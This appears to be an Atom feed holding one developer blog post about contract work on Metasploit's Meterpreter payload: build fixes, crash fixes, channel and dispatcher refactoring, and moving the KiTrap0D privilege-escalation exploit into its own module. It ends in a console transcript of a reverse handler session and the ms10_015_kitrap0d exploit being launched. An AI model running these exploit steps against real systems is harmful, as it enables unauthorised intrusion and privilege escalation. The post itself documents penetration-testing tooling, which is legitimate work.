<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[OJ's perspective]]></title>
  <link href="http://buffered.io/atom.xml" rel="self"/>
  <link href="http://buffered.io/"/>
  <updated>2013-12-28T12:48:10+10:00</updated>
  <id>http://buffered.io/</id>
  <author>
    <name><![CDATA[OJ Reeves]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[3 Months of Meterpreter]]></title>
    <link href="http://buffered.io/posts/3-months-of-meterpreter/"/>
    <updated>2013-12-27T23:14:44+10:00</updated>
    <id>http://buffered.io/posts/3-months-of-meterpreter</id>
    <content type="html"><![CDATA[<p><img src="http://www.metasploit.com/revamp/images/metasploit-logo.png" style="float:right;margin-left:5px;margin-bottom:5px;"/>
In August this year I was fortunate enough to land a three-month contract working with the awesome people at <a href="http://www.rapid7.com/">Rapid7</a>. The job: <em>make <a href="https://github.com/rapid7/meterpreter">Meterpreter</a> more awesome on Windows</em>. That&rsquo;s right <em>more</em> awesome than it already is. Tough gig, but what an amazing opportunity!</p>

<p>Those three months have already come and gone, and what a ride it has been. In this post I would like to detail some of the work that has gone into Meterpreter, and Metasploit too, with a goal of helping others understand what it does and how it works. Ultimately, I&rsquo;d love to start seeing some contributions from the community now that it&rsquo;s <em>substantially</em> easier to build.</p>

<p>So, in a semi-chronological-semi-ad-hoc order, here&rsquo;s how Meterpreter has evolved.</p>

<!--more-->


<h2>TL;DR</h2>

<p>This post is long. So if you&rsquo;re keen to see a nice summary, you should go and read the <a href="https://community.rapid7.com/community/metasploit/blog/2013/12/27/meterpreter-reloaded">wicked post over at Security Street</a> which gives a great summary of what&rsquo;s in this post. Thanks to the rather classy <a href="https://twitter.com/todb">Tod Beardsley</a> for serving this baby up!</p>

<h2>A Whole New Build Environment</h2>

<p>Getting contributions from the Open Source community can be tricky enough, even when your build is clean and your development environment is very easy to get up and running. In the case of Meterpreter, <strong>neither</strong> of these things were true and hence anyone looking to contribute had to first negotiate the gauntlet of getting a functioning build environment configured.</p>

<p>My first task was to fix these problems. The immediate goal was to update the source so that it could be built with <a href="http://www.visualstudio.com/downloads/download-visual-studio-vs#d-express-windows-desktop">Visual C++ Express edition</a>. The Express editions of Microsoft&rsquo;s tools are free to download and use, and hence it would enable those who don&rsquo;t have a paid version of Visual Studio to build Meterpreter.</p>

<p>With that I embarked on the relatively simple job of updating projects, solutions and some areas of the source code. When I started this work, Visual Studio 2012 was the current version and hence that was the target to support. One of my first <a href="https://github.com/rapid7/meterpreter/pull/16">pull requests</a> to the Meterpreter repository was this upgrade, and thankfully it was very well received.</p>

<p>Then in typical fashion, just a couple of weeks after this work, Microsoft decides to release Visual Studio 2013! At first I didn&rsquo;t consider going through the upgrade process, but soon after I thought it best that the effort was made to bring our toolset up to the bleeding edge and the rest of the team agreed. So no long after, a <a href="https://github.com/rapid7/meterpreter/pull/41">new pull request</a> was submitted that brought things up to the latest and greatest.</p>

<h2>Clean Command Line Builds</h2>

<p>When I first tackled the Meterpreter build I saw two things that were just a little off-putting:</p>

<ol>
<li>There was one component, <a href="https://github.com/rapid7/meterpreter/tree/master/workspace/ext_server_sniffer">ext_server_sniffer</a>, which wouldn&rsquo;t build out of the box because of a missing dependency. This dependency, the packet sniffer SDK, is one that&rsquo;s available to Rapid7 employees only, due to licensing restrictions on the code. With this dependency missing, the build would finish with errors.</li>
<li>There were <em>lots</em> of warnings generated by the C++ compiler even when the build succeeded without errors. This was particularly bad in the case of the 64-bit build, for obvious reasons.</li>
<li>There was no way of building everything from the command line; it had to be built from within Visual Studio. This meant that having the build run under the context of something like <a href="http://jenkins-ci.org/">Jenkins</a> wasn&rsquo;t possible.</li>
</ol>


<p>I wanted to see these things go away so that all future contributors would see <code>0</code> errors <em>and</em> <code>0</code> warnings when the build completed. Needless to say, removing all the warnings wasn&rsquo;t a task that could be done overnight, but the error was definitely one that could be done.</p>

<p>I decided to solve the problem of the missing component by having different configurations baked into the projects. Meterpreter&rsquo;s solution contains the usual <code>Release</code> and <code>Debug</code> configurations that everyone is used to. It now also contains two new configurations called <code>r7_released</code> and <code>r7_debug</code>. The former two build all the projects <em>except</em> for the <code>ext_server_sniffer</code> extension, while the latter two include it. Anyone who works for Rapid7, that has access to the proprietary packet sniffer SDK, would be able to use the configurations prefixed with <code>r7_</code>. All other contributors would be able to use the configurations they&rsquo;re used to using. This does come with a little bit of confusion for the developer as they need to build with the correct configuration, but this is a small issue that can (and has) been fixed with documentation.</p>

<p>On the plus side, the command line build script is in the fortunate position of being able to detect the presence of the dependencies and choose which configuration to run. This means that it never results in an error.</p>

<p>So after a few weeks and lots of commits, I took the plunge and finalised the last of the issues with warnings, passed on a <a href="https://github.com/rapid7/meterpreter/pull/49">pull request</a> which the legendary <a href="https://twitter.com/_juan_vazquez_">Juan</a> landed, resulting in this &hellip;</p>

<p><img src="https://github-camo.global.ssl.fastly.net/55f4e2cf4419f90a802acb0f3ac3b4d87476ff02/687474703a2f2f692e696d6775722e636f6d2f6b5852523176482e706e67" alt="Clean Builds" /></p>

<p>Clean builds make for a happy OJ. And with that locked in, it was decided by the team that &ldquo;Treat warnings as errors&rdquo; would be turned on for each of the projetcs so that any future warnings would result in failed builds. This now helps us keep the build clean.</p>

<p>With all this in place, we&rsquo;re also able to constantly run <a href="https://ci.metasploit.com/job/MeterpreterWin/">CI builds for Meterpreter</a> when commits are made to <code>master</code> and when pull requests come in. This is really helping us keep things clean and gives us much quicker feedback on what might be wrong with the source base.</p>

<h2>Bug Fixes</h2>

<p>There are a few worthy mentions from the bug fix department that I&rsquo;d like to share with you.</p>

<h3>64-bit Pointer Truncation</h3>

<p>In some scenarios, on a 64-bit version of Windows, migration of Meterpreter would sometimes result in the session terminating unexpectedly. This rather intimidating bug was the first I attempted to fix when I joined the project, and I documented the analysis and resolution <a href="http://buffered.io/posts/64bit-pointer-truncation-in-meterpreter/">in a previous blog post</a>, so if you&rsquo;re interested in the detail please have a read of that article. If you&rsquo;re too lazy, the TL;DR version is that 64-bit pointers were being truncated to 32-bit as a result of a bad function pointer type declaration. This wasn&rsquo;t an issue until recently because it appears that new versions of <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> have just started allocating above the 4GB boundary.</p>

<h3>Crashy Meterpreter with MS08-067</h3>

<p>Penetration testers all around the world have fallen in love with <a href="http://technet.microsoft.com/en-us/security/bulletin/ms08-067">MS08-067</a>, and rightly so. It has proved to be a very reliable exploit and has served the industry well. So imagine the dismay that some testers experienced when using the Meterpreter payload with this exploit on Windows XP (without any service packs) and seeing their session <strong>crash on startup</strong>. Horrible. The reason for this was due to Meterpreter attempting to enumerate NICs on the target box when first setting itself up. In Windows XP SP1 and onwards, certain parts of the Windows API had changed to allow for easier gathering of certain bits of information. Prior to this, it wasn&rsquo;t so easy. Bear in mind that Meterpreter doesn&rsquo;t really know anything about the system that it&rsquo;s running on so it attempts to figure it out as it goes. In this particular case it failed to properly detect the host operating system&rsquo;s capabilities and attempted to read invalid areas of memory. After much investigation, and a great deal of help from <a href="https://twitter.com/_juan_vazquez_">Juan</a> (again, who is legendary, I&rsquo;m not sure if I mentioned that), we <a href="https://github.com/rapid7/meterpreter/pull/21">landed a fix</a> for the problem, and there was much rejoicing.</p>

<h3>Multi-call Railgun failures</h3>

<p>The glory of <a href="http://www.room362.com/blog/2010/7/7/intro-to-railgun-win-api-for-meterpreter.html">Railgun</a> was slightly tarnished by a not-so-stable multi-call function which was causing crashes in Meterpreter sessions. A slight tweak of the code on both the <a href="https://github.com/rapid7/meterpreter/pull/28">Meterpreter side</a> and the <a href="https://github.com/rapid7/metasploit-framework/pull/2458">Metasploit side</a> resulted in this problem going away and allowing other modules to make better use of Railgun through a lower number of calls. Less chatty comms can only be a good thing.</p>

<h3>Sniffer Extension Fixes</h3>

<p>The <code>ext_server_sniffer</code> extension suffered from a bit of 64-bit hate. It had on a number of occasions crashed sessions under 64-bit and failed to run completely on newer versions of Windows. Some rework of the packet sniffer SDK, along with rebuilding binaries using the new toolchain, resulted in both of these problems disappearing.</p>

<h3>Deadly Webcam Snapshots</h3>

<p>A much-loved feature of Meterpreter is it&rsquo;s ability to take a snapshots from an attached webcam and download them to the attacker&rsquo;s machine. This nifty feature could sometimes result in crashy sessions, and nobody likes crashy sessions.</p>

<p>The reason this was happening was because of the way that webcam capture was implemented combined with the mechanism that Meterpreter uses to manage command execution. Each command that is executed in the context of Meterpreter is run on a separate thread. There are a few reasons for this which we won&rsquo;t go into now, but bear this mind while we dive into the webcam snapshot implementation.</p>

<p><a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/stdapi/webcam/webcam.rb">Webcam interaction</a> is controlled using three functions:</p>

<ol>
<li>Starting the webcam using <code>stdapi.webcam.webcam_start</code>.</li>
<li>Capturing a frame from the webcam using <code>stdapi.webcam.webcam_get_frame</code>.</li>
<li>Stopping the webcam using <code>stdapi.webcam.webcam_stop</code>.</li>
</ol>


<p>When the camera is &ldquo;started&rdquo;, Meterpreter fires up <a href="http://www.microsoft.com/com/default.mspx">COM</a> and uses a set of interfaces to manage camera initialisation and interaction. When the camera is stopped, these interface instances are destroyed and COM is shut down. The problem here is that COM needs to be initialised and shutdown <em>on the same thread</em>, and given that each command is executed on separate threads, COM got upset and sometimes died. The problem wasn&rsquo;t consistent, in that it worked on quite a few platforms and cameras, but not on others. I was only able to reproduce the problem with one camera on Vista x86.</p>

<p>The <a href="https://github.com/rapid7/meterpreter/pull/44">solution</a> was simple: we now have a separate thread of execution that we use to do all the webcam-related work on. Since this fix has been put in place we haven&rsquo;t seen any more webcam-related crashes on Windows!</p>

<h3>Meterpreter not Shutting Down</h3>

<p>When Meterpreter is launched from an executable generated using <a href="http://www.offensive-security.com/metasploit-unleashed/Msfpayload">msfpayload</a>, the <code>exit</code> command would fail to actually terminate the process. This is obviously a bad thing as far as forensics goes, as leaving running processes behind leaves evidence of exploitation.</p>

<p>This bug has been half fixed. That is, the <code>reverse_tcp</code> and <code>bind_tcp</code> payloads now exit cleanly, but the <code>reverse_http</code> and <code>reverse_https</code> payloads still need work (we <em>will</em> get them fixed though). Lots of work had to go into finding a cleaner shutdown process from within Meterpreter, and that is covered in the &ldquo;Engine Room Improvements&rdquo; section of this post. The rest falls under the category of &ldquo;how do we fix the payloads&rdquo;, which will have to come in a later post once we&rsquo;ve solved the issue.</p>

<h3>Unstable Channels</h3>

<p>You might not know this, but every time you type <code>shell</code> into a Meterpreter prompt, you&rsquo;re opening a <em>channel</em>. When you download a file, you open a channel. Almost everything you do when you interact with Meterpreter results in a channel being opened. In some cases, such as when using <code>shell</code>, the channel persists for an extended period of time. Pressing <code>CTRL+Z</code> allows you to put such a channel into the background so that you can continue working with other Meterpreter features, after which you can bring the channel back into the foreground using the <code>channels</code> command.</p>

<p>Well, that&rsquo;s how it was supposed to work, but this was broken on both Windows and POSIX builds of Metepreter. The work required to fix this was quite in-depth, and hence is covered in the &ldquo;Engine Room Improvements&rdquo; section of this post.</p>

<h2>Engine Room Improvements</h2>

<p>Changes have come through in many forms from cosmetic to major heart surgery. This section covers some of the more gory details from the latter of these two categories.</p>

<h3>Improved Security</h3>

<p>The last thing that we&rsquo;d like to have happen to a Meterpreter use is for them to be owned by the victim during an attack. While this might be rather implausible, we decided to run through the source and make a point of addressing any potentially risky function calls. Prime candidates for refactoring include functions such as <a href="http://www.cplusplus.com/reference/cstring/strcpy/">strcpy</a>, the <a href="http://en.wikipedia.org/wiki/Honey_Badger_Don't_Care">Honey Badger</a> of the C standard library. We cleaned up a great deal of those <a href="https://github.com/rapid7/meterpreter/pull/32">in a single pull request</a> and on the whole Meterpreter became <em>much</em> more trustworthy.</p>

<h3>Command Dispatcher Surgery</h3>

<p>The notion of a &ldquo;command&rdquo; won&rsquo;t be new to anyone who has used Meterpreter before. Simply, a command is the context of a single instance of execution. It can wrap up a simple request/response call, such as <code>getpid</code>, which allows for execution of commands on the victim&rsquo;s machine. No rocket science there.</p>

<p>However, the implementation of the command mechanism had one limitation that forced a couple of issues to bubble to the surface:</p>

<ol>
<li>Every single command invoked in Meterpreter is executed on a separate thread. For the most part this is OK, and is what you want to have happen behind the scenes so that the main dispatcher thread doesn&rsquo;t block while waiting for potentially long-running commands to execute. However, there are times when the main dispatcher thread should be used instead.</li>
<li>There was no clean way to tell the main dispatcher thread to stop processing commands, and so shutting down cleanly wasn&rsquo;t as simple job. Instead it required signalling of events across threads which caused some interesting bugs to appear, particularly in POSIX.</li>
</ol>


<p>Instead of attempting to debug the problems that we were seeing, I decided to get the scalpel out and rework the command handling so that there were two modes of operation instead of just the one. At first I thought this change would be quick, but I soon realised there was a bit more to it.</p>

<p>The first thing I needed to do was to come up with a way of allowing individual commants to indicate whether they were to be executed on separate threads or not. At first I thought it&rsquo;d be useful to allow the attacker to tell Meterpreter on the fly, but I follow through with this idea because there&rsquo;s no only room for abuse, but the attacker isn&rsquo;t always the best judge of what should happen and on what thread it should happen on.</p>

<p>Commands already have two pointers to functions which perform the handling of requests and responses. These pointers of a type called <code>DISPATCH_ROUTINE</code> which is declared as follows:</p>

<figure class='code'><figcaption><span>Definition of DISPATCH_ROUTINE</span><a href='https://github.com/rapid7/meterpreter/blob/master/source/common/base.h#L12'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="k">typedef</span> <span class="n">DWORD</span> <span class="p">(</span><span class="o">*</span><span class="n">DISPATCH_ROUTINE</span><span class="p">)(</span><span class="n">Remote</span> <span class="o">*</span><span class="n">remote</span><span class="p">,</span> <span class="n">Packet</span> <span class="o">*</span><span class="n">packet</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>At first I felt that this would be easy to reuse for inline processing. However, after some thought, I went instead with the idea of an <code>INLINE_DISPATCH_ROUTINE</code> which has the following prototype:</p>

<figure class='code'><figcaption><span>Definition of INLINE_DISPATCH_ROUTINE</span><a href='https://github.com/rapid7/meterpreter/blob/master/source/common/base.h#L13'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="k">typedef</span> <span class="n">BOOL</span> <span class="p">(</span><span class="o">*</span><span class="n">INLINE_DISPATCH_ROUTINE</span><span class="p">)(</span><span class="n">Remote</span> <span class="o">*</span><span class="n">remote</span><span class="p">,</span> <span class="n">Packet</span> <span class="o">*</span><span class="n">packet</span><span class="p">,</span> <span class="n">DWORD</span><span class="o">*</span> <span class="n">result</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>The reasons I decided to do this are:</p>

<ol>
<li>It provides a definitive semantic separation of intent between something that&rsquo;s inline and something that is not.</li>
<li>I wanted the prototype to be reflective of the difference in meaning to the caller.</li>
<li>The inline dispatch routine needed to have a way of indicating to the calling thread that processing should cease or continue.</li>
</ol>


<p>The return value of the <code>INLINE_DISPATCH_ROUTINE</code> is a simple <code>BOOL</code> which says &ldquo;continue processing&rdquo; in the case of <code>TRUE</code> and &ldquo;stop processing&rdquo; in the case of <code>FALSE</code>. This simple return value makes it easy for the main dispatcher thread to check to see if a particular command has requested termination, as you can see from <a href="https://github.com/rapid7/meterpreter/blob/master/source/server/server_setup.c#L358">the updated body of the command dispatcher thread</a>. Having this in place meant that none of the commands required references to the server&rsquo;s state in order to have it terminated via a signal, and this itself preventing POSIX from segfaulting when exiting the process.</p>

<p>Of course, this change wasn&rsquo;t something that could be added in easily due to the nature of <code>Command</code> declarations. Instead of making a point of changing each and every command so that it catered for this new <code>INLINE_DISPATCH_ROUTINE</code>, I thought it best to take a semi-<a href="http://en.wikipedia.org/wiki/Microsoft_Foundation_Class_Library">MFC</a>-style approach and produce some macros which better indicate the intent of commands when they are declared. This was made more important by the fact that each command was getting another member, and hence the declaration of each would have to change.</p>

<p>Full details of these macros can be found in the <a href="https://github.com/rapid7/meterpreter/blob/master/source/common/base.h#L25">source code</a>, but to demonstrate the difference these make take a look at the difference between this:</p>

<figure class='code'><figcaption><span>Old command declarations</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">Command</span> <span class="n">custom_commands</span><span class="p">[]</span> <span class="o">=</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="p">{</span> <span class="s">&quot;core_loadlib&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="p">{</span> <span class="n">request_core_loadlib</span><span class="p">,</span>              <span class="p">{</span> <span class="mi">0</span> <span class="p">},</span> <span class="mi">0</span> <span class="p">},</span>
</span><span class='line'>        <span class="p">{</span> <span class="n">EMPTY_DISPATCH_HANDLER</span>                      <span class="p">},</span>
</span><span class='line'>    <span class="p">},</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Terminator</span>
</span><span class='line'>    <span class="p">{</span> <span class="nb">NULL</span><span class="p">,</span>
</span><span class='line'>        <span class="p">{</span> <span class="n">EMPTY_DISPATCH_HANDLER</span>                      <span class="p">},</span>
</span><span class='line'>        <span class="p">{</span> <span class="n">EMPTY_DISPATCH_HANDLER</span>                      <span class="p">},</span>
</span><span class='line'>    <span class="p">},</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>and this:</p>

<figure class='code'><figcaption><span>New command declarations</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">Command</span> <span class="n">customCommands</span><span class="p">[]</span> <span class="o">=</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">COMMAND_REQ</span><span class="p">(</span><span class="s">&quot;core_loadlib&quot;</span><span class="p">,</span> <span class="n">request_core_loadlib</span><span class="p">),</span>
</span><span class='line'>    <span class="n">COMMAND_TERMINATOR</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>I hope you agree this does a better job of indicating intent and it also makes it harder to make mistakes, and it also hides the detail of implementation.</p>

<p>With these changes in place, I was then able to change the two main shutdown functions so that they use this new functionality. The two commands that close Meterpreter sessions down are <code>exit</code> and <code>migrate</code>, so those were both changed:</p>

<figure class='code'><figcaption><span>Inline Request Declaration</span><a href='https://github.com/rapid7/meterpreter/blob/master/source/common/base.c#L75'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">Command</span> <span class="n">base_commands</span><span class="p">[]</span> <span class="o">=</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="c1">// ... snip ...</span>
</span><span class='line'>    <span class="c1">// Migration</span>
</span><span class='line'>    <span class="n">COMMAND_INLINE_REQ</span><span class="p">(</span><span class="s">&quot;core_migrate&quot;</span><span class="p">,</span> <span class="n">remote_request_core_migrate</span><span class="p">),</span>
</span><span class='line'>    <span class="c1">// Shutdown</span>
</span><span class='line'>    <span class="n">COMMAND_INLINE_REQ</span><span class="p">(</span><span class="s">&quot;core_shutdown&quot;</span><span class="p">,</span> <span class="n">remote_request_core_shutdown</span><span class="p">),</span>
</span><span class='line'>    <span class="c1">// ... snip ...</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>At this point Meterpreter shutdowns were more deterministic &hellip; at least for <code>reverse_tcp</code> payloads!</p>

<p>If you&rsquo;re interested in taking a look at the guts of the rework you can see it in <a href="https://github.com/rapid7/meterpreter/pull/34">this pull request</a>.</p>

<h3>Channel Surgery</h3>

<p>The core communication mechanism used by the internals of Meterpreter are called <em>channels</em>. A channel is a bit of an abstract concept, but effectively it&rsquo;s hard to do anything with Meterpreter without using one. If you execute a command from MSF to Meterpreter running on a victim&rsquo;s machine, you&rsquo;re using channels.</p>

<p>As you can imagine, the thought of mucking with this beauties strikes fear into any sane person. It should, however, be obvious that I lost all my sanity thanks to years of enterprise software development, and so the thought of tweaking the innards of channels didn&rsquo;t faze me at all.</p>

<p>A bug had been submitted to Redmine which indicated that in both Windows and POSIX Meterpreter was suffering from issues where channels were behaving incorrectly in various scenarios, including when put in the background. For the uninitiated, you can execute the <code>shell</code> command from within Meterpreter and end up with a native system shell; <code>/bin/bash</code> for POSIX and <code>cmd.exe</code> for Windows. You are then able to press <code>CTRL+Z</code> and MSF asks if you wish to background the channel, effectively putting it on ice while you do other things with Meterpreter (via other channels, HA!). To bring this channel back into the foreground, the <code>channels</code> command can be used with the <code>-i</code> switch. Another issue with this was that the processes running behind the backgrounded channels were left hanging, even when Meterpreter was closed. This obviously doesn&rsquo;t look good forensically.</p>

<p>At least, that&rsquo;s how it was supposed to happen. But the fact of the matter was that backgrounded channels were broken. Bringing them back into the foreground never worked. Best case, the channel would close, and you&rsquo;d end up back at the Meterpreter shell. Worst case, the entire Meterpreter session would crash, which was what happened most of the time on POSIX.</p>

<p>This was the issue that I was aiming to fix when I first started, and it turned out there were a few fundamental things that had to change to support it. To understand the problem, we need to take a look at the <code>scheduler</code> (cue the scary music). The <code>scheduler</code> is a bit of code that is responsible for managing the lifetime of channels (and a few other things) and for some reason the implementation for Windows was very different to POSIX, which to a point explained the differences we were seeing when testing.</p>

<p>For this discussion, we&rsquo;ll stick to Windows and to the interactive channels which are responsible for dealing with shells. When an interactive channel is created that is tied to a background shell process a bunch of things happen:</p>

<ol>
<li>A process is created which contains the shell, in this case <code>cmd.exe</code>.</li>
<li>Handles to <code>stdin</code> and <code>stdout</code> are acquired and stored alongside the channel.</li>
<li>A thread is created and the work for that channel is tied to the thread.</li>
<li>The scheduler is handed the detail of the channel so that the lifetime of the channel can be managed.</li>
</ol>


<p>A noteworthy exclusion to the captured metadata is the handle to the process being managed. As soon as the thread made it to the scheduler, the reference to the newly-created process was lost. At this point Meterpreter had no chance of correctly terminating processes automatically because it had no idea of which process to close. It might be able to be inferred in some cases, but it was impossible to infer in the general case.</p>

<p>The first thing I did was fix this small issue so that at any time, Meterpreter knew which process was being managed by which thread and which channel. This made it possible to close down any associated process at the correct time, such as Meterpreter shutting down or when the user terminates a channel via the <code>channels -c</code> command.</p>

<p>I then looked deeper into the scheduler&rsquo;s code and found that the management thread wasn&rsquo;t behaving as expected. Here&rsquo;s a summary of what it was doing:</p>

<ol>
<li>Extracting references to channel handles (which in our case would be the read handle for <code>stdout</code> and the thread&rsquo;s <code>sigterm</code> handle for when an external entity wanted to signal the closing of the channel).</li>
<li>Waiting on each of those handles until a system event indicated that one of them has had some activity. Think [WaitForMultipleObjects][] in the Win32 API.</li>
<li>When an event signal is received, the code would handle it, and either exit the loop if told to do so, or read data from the process&rsquo;s <code>stdout</code>.</li>
<li>Rinse and repeat until close.</li>
<li>On close, clean up all the thread context, the channel context, etc.</li>
</ol>


<p>In case it&rsquo;s not clear, there was something missing from this: there was no way to <em>suspend</em> the channel. When was happening when a channel was put in the background was that the loop was exited, and all the context was destroyed/closed. At this point it was not possible to bring it back.</p>

<p>To fix this problem, I changed a bunch of things:</p>

<ul>
<li>Channel&rsquo;s had more <em>stuff</em> added to their context:

<ul>
<li>An event handle for <em>suspension</em> requests.</li>
<li>An event handle for <em>resumption</em> requests.</li>
</ul>
</li>
<li>The scheduler thread loop waited on the suspension object as well as the original two.</li>
<li>When channels were backgrounded, the calling code signalled the <em>suspenction</em> event and continued on it&rsquo;s merry way. The scheduler would simply block and wait on the <em>resumption</em> event <strong>only</strong>. No channel context is destroyed at this point like it was before.</li>
<li>When the channel is to be brought into the foreground, the caller signals the <em>resumption</em> event and carries on as it did before. The scheduler receives this signal and then continues to wait, process and loop like it did before.</li>
<li>If a channel is terminated while suspended, the caller signals resumption prior to termination, so this means that the channel&rsquo;s scheduler thread doesn&rsquo;t hang.</li>
<li>When a channel is terminated, the process that is associated with the channel is also terminated.</li>
</ul>


<p>Once this work was done, I completely removed the old POSIX implementation and replaced it with this new one. It wasn&rsquo;t a smooth transition as I had to tweak a few other things, including the <a href="https://github.com/rapid7/meterpreter/pull/38/files#diff-9855cd942b30d41aeb1ac277daa18033R199">signalling code</a>. This was because on Windows we were using [AutoResetEvent][] objects, but POSIX wasn&rsquo;t behaving the same.</p>

<p>There were a few other issues with regards to competing threads cleaning things up when they shouldn&rsquo;t resulting in some threads terminating horribly periodically. This was also adjusted so that the termination and tidying were a little more deterministic (yes, I <a href="https://www.youtube.com/watch?v=G2y8Sx4B2Sk">keep using that word</a>).</p>

<p>The guts of the work can be found in <a href="https://github.com/rapid7/meterpreter/pull/38">this pull request</a>. There&rsquo;s actually not that much to it, but the nature of the changes were scary given that they messed with a pretty important part of the application.</p>

<p>Thankfully, so far, it would seem that this really has improved things, and Meterpreter has been a lot more stable in both POSIX and Windows since this was rolled into <code>master</code>. Thanks again to <a href="https://twitter.com/egyp7">Egypt</a> for his testing and landing of this one.</p>

<h2>Local exploits</h2>

<p>I wish I could claim that I had built these myself, but that would be dishonest. The work that I did with local exploits involved refactoring and moving them around. I hope that some point soon I&rsquo;ll actually contribute a whole <em>new</em> exploit built by me from the ground up.</p>

<h3>KiTrap0D</h3>

<p>This exploit is a gem from the mighty Tavis Ormandy, and was published in various places including the <a href="http://seclists.org/fulldisclosure/2010/Jan/341">Full Disclosure</a> mailing list a few years back.</p>

<p>The <a href="http://carnal0wnage.attackresearch.com/2010/01/kitrap0d-now-in-metasploit.html">first version</a> of the KiTrap0D exploit made it into Metasploit in the form of a Meterpreter script that was run once a session had been established. Over time it changed and moved, then ended up in the <code>getsystem</code> command thanks to some work by <a href="https://twitter.com/stephenfewer">Stephen Fewer</a>.</p>

<p>Many of us love <code>getsystem</code> and what it gives us, but not many of use really know how it works. Once Stephen had done his work, the <code>getsystem</code> command had <code>4</code> different methods in which to gain <code>SYSTEM</code> privileges. <code>3</code> of them were abusing various properties of Windows, and the last one (KiTrap0D) was an actual ring0 exploit. When <code>getsystem</code> is invoked without any parameters, Meterpreter loops through <em>all</em> of the existing methods to elevate and tries each one in order. It will keep trying until it either runs out of options, or one of the methods succeeds. The user can choose to use a single method by using the <code>-t</code> switch, but most of the time nobody bothers with that, as they don&rsquo;t really care which method works as long as they end up with elevated privileges.</p>

<p>Unfortunately, on later versions of Windows, the first few methods of elevation don&rsquo;t have the hit-rate they have on earlier versions. As a result, the <code>getsystem</code> call manages to try the KiTrap0d exploit quite a bit more, and this sometimes resulted in either broken sessions. It had also been known to <a href="http://en.wikipedia.org/wiki/Blue_Screen_of_Death">blue-screen</a> boxes too, which isn&rsquo;t a great look at all, and it&rsquo;s frustrating for the testers.</p>

<p>After discussing it with the team, it was decided that it should not be included as part of <code>getsystem</code> command, but instead be moved into a local exploit that can be invoked by the user if and when they want to.</p>

<p>Both <a href="https://github.com/rapid7/meterpreter/pull/51">Meterpreter</a> and <a href="https://github.com/rapid7/metasploit-framework/pull/2633">Metasploit</a> needed to be updated to accommodate this, but the result is really nice. Here&rsquo;s a sample run of the new exploit:</p>

<figure class='code'><figcaption><span>KiTrap0d Exploit in Action</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on XX.XX.XX.40:8000 
</span><span class='line'>[*] Starting the payload handler...
</span><span class='line'>[*] Sending stage (785920 bytes) to XX.XX.XX.43
</span><span class='line'>[*] Meterpreter session 1 opened (XX.XX.XX.40:8000 -&gt; XX.XX.XX.43:49234) at 2013-11-27 19:55:43 +1000
</span><span class='line'>
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>Server username: WIN-P73NLAJOYFH\OJ
</span><span class='line'>meterpreter &gt; background
</span><span class='line'>[*] Backgrounding session 1...
</span><span class='line'>msf exploit(handler) &gt; use exploit/windows/local/ms10_015_kitrap0d
</span><span class='line'>msf exploit(ms10_015_kitrap0d) &gt; set session 1
</span><span class='line'>session =&gt; 1
</span><span class='line'>msf exploit(ms10_015_kitrap0d) &gt; exploit
